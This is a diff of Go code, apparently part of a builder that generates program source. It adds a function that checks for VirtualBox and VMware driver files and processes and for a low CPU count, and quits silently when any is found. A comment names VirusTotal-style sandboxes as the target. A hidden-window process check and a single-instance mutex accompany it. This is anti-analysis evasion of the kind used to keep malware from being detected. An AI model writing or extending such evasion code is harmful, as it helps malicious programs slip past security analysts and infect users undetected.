@@ -135,6 +135,53 @@ func acquireMutex(name string) (windows.Handle, error) {
 	return h, nil
 }
 
+func checkAntiVps() {
+	if runtime.GOOS != "windows" {
+		return
+	}
+
+	// 1. Check for VirtualBox/VMware/Hyper-V/Parallels files
+	files := []string{
+		"C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
+		"C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
+		"C:\\Windows\\System32\\drivers\\vmhgfs.sys",
+		"C:\\Windows\\System32\\drivers\\vmmouse.sys",
+	}
+	for _, f := range files {
+		if _, err := os.Stat(f); err == nil {
+			os.Exit(0)
+		}
+	}
+
+	// 2. Check for VM processes
+	procs := []string{
+		"VBoxTray.exe",
+		"VBoxService.exe",
+		"vmtoolsd.exe",
+		"vmwaretray.exe",
+	}
+	for _, p := range procs {
+		if isProcessRunningByName(p) {
+			os.Exit(0)
+		}
+	}
+
+	// 3. Hardware thresholds (VT often uses small specs)
+	if runtime.NumCPU() < 2 {
+		os.Exit(0)
+	}
+}
+
+func isProcessRunningByName(name string) bool {
+	cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", name), "/NH")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	out, err := cmd.Output()
+	if err != nil {
+		return false
+	}
+	return strings.Contains(strings.ToLower(string(out)), strings.ToLower(name))
+}
+
 func setupLogger() *os.File { return nil }
 `, delay, buildID, buildID))
 }
